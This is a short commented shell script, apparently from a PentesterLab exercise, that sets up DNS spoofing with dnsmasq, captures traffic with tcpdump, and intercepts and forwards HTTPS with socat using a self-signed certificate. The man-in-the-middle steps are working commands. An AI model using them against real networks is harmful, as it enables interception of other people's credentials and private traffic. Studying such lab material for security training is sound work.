# configure a simple DNS server
echo 'addn-hosts=dnsmasq.hosts' > dnsmasq.conf
echo '127.0.0.123 test1.pentesterlab.com' > dnsmasq.hosts

# configure the router to redirect UDP 53 from WAN to LAN

# run the DNS server
sudo dnsmasq -C dnsmasq.conf --no-daemon

# dump the UDP traffic
sudo tcpdump -i wlan0 udp port 53

# add the new subdomain to the list
echo '1.2.3.4 mitm1.pentesterlab.com' >> dnsmasq.hosts

# configure the router to redirect TCP 80 & 443 from WAN to LAN

# create a certificate for TLS traffic
FILENAME="server"
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem

# and capture HTTPS requests
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -

# bonus: capture and forward
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
